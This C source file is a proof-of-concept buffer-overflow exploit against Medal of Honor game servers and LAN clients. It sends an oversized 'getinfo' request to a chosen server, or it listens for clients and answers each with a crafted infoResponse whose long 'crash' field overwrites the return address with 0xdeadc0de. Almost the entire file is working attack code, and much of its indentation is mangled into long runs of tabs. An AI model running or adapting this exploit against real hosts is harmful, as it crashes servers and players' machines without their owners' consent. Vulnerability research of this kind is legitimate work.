/*
 *
 * by Luigi Auriemma
 *
 * */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef WIN32
    #include <winsock.h>
    #include <io.h>
    #include <malloc.h>
    #include "winerr.h"

    #define close   closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netdb.h>
#endif



#define VER         "0.1"
#define BUFFSZ      4096
#define PORT        12203
#define TIMEOUT     3
#define INFO        "\xff\xff\xff\xff\x02" "getinfo xxx\n"
#define BOFWIN      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
		                        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
					                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
							                        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
										                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
												                        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
															                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
																	                        "aaaa" "\xde\xc0\xad\xde"  // EIP deadc0de
#define BOFLINUX    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
																				                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
																						                        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
																									                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
																											                        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
																														                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
																																                        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
																																			                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
																																					                        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
																																								                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
																																										                        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
																																													                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
																																															                        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
																																																		                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
																																																				                        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
																																																							                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
																																																									                        "aaaa" "\xde\xc0\xad\xde"  // EIP deadc0de
#define SVBOF       "\xff\xff\xff\xff\x02" "getinfo %s\n"
#define CLBOF       "\xff\xff\xff\xff" \
																																																												                    "\x01" \
																																																														                        "infoResponse\n" \
																																																																	                    "\\pure\\0" \
																																																																			                        "\\gametypestring\\Free-For-All" \
																																																																						                    "\\gametype\\1" \
																																																																								                        "\\sv_maxclients\\16" \
																																																																											                    "\\clients\\0" \
																																																																													                        "\\mapname\\DM/mohdm1" \
																																																																																                    "\\hostname\\myserver" \
																																																																																		                        "\\protocol\\8" \
																																																																																					                    "\\crash\\" BOFWIN \
																																																																																							                        "\\challenge\\xxx"




																																																																																										void showinfostring(u_char *buff, int size);
																																																																																										int timeout(int sock);
																																																																																										u_long resolv(char *host);
																																																																																										void std_err(void);



																																																																																										int main(int argc, char *argv[]) {
																																																																																											    int         sd,
																																																																																											                    len,
																																																																																													                    psz,
																																																																																															                    on = 1,
																																																																																																	                    type;
																																																																																																			        u_short     port = PORT;
																																																																																																				    u_char      buff[BUFFSZ + 1];
																																																																																																				        struct  sockaddr_in peer;


																																																																																																					    setbuf(stdout, NULL);

																																																																																																					        fputs("\n"
																																																																																																								        "Medal of Honor buffer-overflow "VER"\n"
																																																																																																									        "  Vulnerables: AA <= 1.11v9, SH <= 2.15, BT <= 2.40b\n"
																																																																																																										        "by Luigi Auriemma\n"
																																																																																																											        "e-mail: aluigi@altervista.org\n"
																																																																																																												        "web:    http://aluigi.altervista.org\n"
																																																																																																													        "\n", stdout);

																																																																																																						    if(argc < 2) {
																																																																																																							            printf("\nUsage: %s <attack> [port(%d)]\n"
																																																																																																										                "\n"
																																																																																																												            "Attack:\n"
																																																																																																													                " c = LAN clients buffer-overflow. It cannot work online because online is\n"
																																																																																																															            "     used the Gamespy protocol that is not affected by this bug\n"
																																																																																																																                " s = server buffer-overflow: you can test this PoC versus a specific server.\n"
																																																																																																																		            "     You must add the IP or the hostname of the server after the 's'.\n"
																																																																																																																			                "     The PoC first tests the overflow for Win32 servers and then for Linux\n"
																																																																																																																					            "     that requires more data for overwriting the return address\n"
																																																																																																																						                "\n"
																																																																																																																								            "Some usage examples:\n"
																																																																																																																									                "  mohaabof c                      listens on port %d for clients\n"
																																																																																																																											            "  mohaabof c 1234                 listens on port 1234\n"
																																																																																																																												                "  mohaabof s 192.168.0.1          tests the server 192.168.0.1 on port %d\n"
																																																																																																																														            "  mohaabof s 192.168.0.1 1234     tests the server 192.168.0.1 on port 1234\n"
																																																																																																																															                "\n"
																																																																																																																																	            "The return address of the vulnerable hosts will be ever overwritten by the\n"
																																																																																																																																		                "offset 0xdeadc0de\n"
																																																																																																																																				            "\n", argv[0], PORT, PORT, PORT);
																																																																																																								            exit(1);
																																																																																																									        }

#ifdef WIN32
																																																																																																						        WSADATA    wsadata;
																																																																																																							    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif    

																																																																																																							        type = argv[1][0];
																																																																																																								    if((type != 'c') && (type != 's')) {
																																																																																																									            fputs("\n"
																																																																																																												                "Error: Wrong type of attack.\n"
																																																																																																														            "       You can choose between 2 types of attacks, versus clients with 'c' or\n"
																																																																																																															                "       versus servers with 's'\n"
																																																																																																																	            "\n", stdout);
																																																																																																										            exit(1);
																																																																																																											        }
																																																																																																								        if(type == 's') {
																																																																																																										        if(!argv[2]) {
																																																																																																												            fputs("\n"
																																																																																																															                    "Error: you must specify the server IP or hostname.\n"
																																																																																																																	                    "       Example: mohaabof s localhost\n"
																																																																																																																			                    "\n", stdout);
																																																																																																													                exit(1);
																																																																																																															        }
																																																																																																											        peer.sin_addr.s_addr = resolv(argv[2]);
																																																																																																												        if(argc > 3) port = atoi(argv[3]);
																																																																																																													        printf("\n- Target   %s:%hu\n\n",
																																																																																																																            inet_ntoa(peer.sin_addr),
																																																																																																																	                port);
																																																																																																														    } else {
																																																																																																															            peer.sin_addr.s_addr = INADDR_ANY;
																																																																																																																            if(argc > 2) port = atoi(argv[2]);
																																																																																																																	            printf("\n- Listening on port %d\n", port);
																																																																																																																		        }

																																																																																																									    peer.sin_port   = htons(port);
																																																																																																									        peer.sin_family = AF_INET;
																																																																																																										    psz             = sizeof(peer);

																																																																																																										        sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
																																																																																																											    if(sd < 0) std_err();

																																																																																																											        if(type == 's') {
																																																																																																													        fputs("- Request informations\n", stdout);
																																																																																																														        if(sendto(sd, INFO, sizeof(INFO) - 1, 0, (struct sockaddr *)&peer, psz)
																																																																																																																	          < 0) std_err();
																																																																																																															        if(timeout(sd) < 0) {
																																																																																																																	            fputs("\nError: socket timeout, probably the server is not online\n\n", stdout);
																																																																																																																		                exit(1);
																																																																																																																				        }
																																																																																																																        len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL);
																																																																																																																	        if(len < 0) std_err();
																																																																																																																		        buff[len] = 0x00;

																																																																																																																			        showinfostring(buff, len);

																																																																																																																				        printf("- Send BOOM packet for the Windows version (data: %d, EIP: 0xdeadc0de)\n",
																																																																																																																							            sizeof(BOFWIN) - 1);
																																																																																																																					        len = sprintf(buff, SVBOF, BOFWIN);
																																																																																																																						        if(sendto(sd, buff, len, 0, (struct sockaddr *)&peer, psz)
																																																																																																																									          < 0) std_err();

																																																																																																																							        if(timeout(sd) < 0) {
																																																																																																																									            fputs("\nServer IS vulnerable!!!\n\n", stdout);
																																																																																																																										            } else {
																																																																																																																												                if(recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL)
																																																																																																																																              < 0) std_err();
																																																																																																																														            fputs("- Server doesn't seem to be vulnerable, It is probably a Linux server\n", stdout);
																																																																																																																															                printf("- Send BOOM packet for the Linux version (data: %d, EIP: 0xdeadc0de)\n",
																																																																																																																																			                sizeof(BOFLINUX) - 1);
																																																																																																																																	            len = sprintf(buff, SVBOF, BOFLINUX);
																																																																																																																																		                if(sendto(sd, buff, len, 0, (struct sockaddr *)&peer, psz)
																																																																																																																																						              < 0) std_err();
																																																																																																																																				            if(timeout(sd) < 0) {
																																																																																																																																						                    fputs("\nServer IS vulnerable!!!\n\n", stdout);
																																																																																																																																								                } else {
																																																																																																																																											                len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL);
																																																																																																																																													                if(len < 0) std_err();
																																																																																																																																															                buff[len] = 0x00;
																																																																																																																																																	                printf("\n"
																																																																																																																																																					                    "Server doesn't seem to be vulnerable, the following is the answer received:\n"
																																																																																																																																																							                        "\n%s\n\n", buff);
																																																																																																																																																			            }
																																																																																																																																					            }
																																																																																																																								    } else {
																																																																																																																									            if(setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, (char *)&on, sizeof(on))
																																																																																																																												              < 0) std_err();
																																																																																																																										            if(bind(sd, (struct sockaddr *)&peer, psz)
																																																																																																																													              < 0) std_err();
																																																																																																																											            fputs("Clients (EIP will be overwritten by 0xdeadc0de):\n", stdout);
																																																																																																																												            while(1) {
																																																																																																																														                len = recvfrom(sd, buff, BUFFSZ, 0, (struct sockaddr *)&peer, &psz);
																																																																																																																																            if(len < 0) std_err();
																																																																																																																																	                buff[len] = 0x00;

																																																																																																																																			            printf("%16s:%hu -> %s\n",
																																																																																																																																						                    inet_ntoa(peer.sin_addr),
																																																																																																																																								                    ntohs(peer.sin_port),
																																																																																																																																										                    buff);

																																																																																																																																				                if(sendto(sd, CLBOF, sizeof(CLBOF) - 1, 0, (struct sockaddr *)&peer, psz)
																																																																																																																																								              < 0) std_err();
																																																																																																																																						        }
																																																																																																																													        }

																																																																																																												    close(sd);
																																																																																																												        return(0);
																																																																																										}





void showinfostring(u_char *buff, int size) {
	    int     nt = 1,
	                len;
			    u_char  *string;

			        len = strlen(buff);
				    if(len < size) buff += len + 1;

				        while(1) {
						        string = strchr(buff, '\\');
							        if(!string) break;

								        *string = 0x00;

									        /* \n or \t */
									        if(!nt) {
											            printf("%30s: ", buff);
												                nt++;
														        } else {
																            printf("%s\n", buff);
																	                nt = 0;
																			        }
										        buff = string + 1;
											    }

					    printf("%s\n\n", buff);
}




int timeout(int sock) {
	    struct  timeval tout;
	        fd_set  fd_read;
		    int     err;

		        tout.tv_sec = TIMEOUT;
			    tout.tv_usec = 0;
			        FD_ZERO(&fd_read);
				    FD_SET(sock, &fd_read);
				        err = select(sock + 1, &fd_read, NULL, NULL, &tout);
					    if(err < 0) std_err();
					        if(!err) return(-1);
						    return(0);
}




u_long resolv(char *host) {
	    struct  hostent *hp;
	        u_long  host_ip;

		    host_ip = inet_addr(host);
		        if(host_ip == INADDR_NONE) {
				        hp = gethostbyname(host);
					        if(!hp) {
							            printf("\nError: Unable to resolv hostname (%s)\n", host);
								                exit(1);
										        } else host_ip = *(u_long *)(hp->h_addr);
						    }
			    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
	            perror("\nError");
		            exit(1);
			        }
#endif



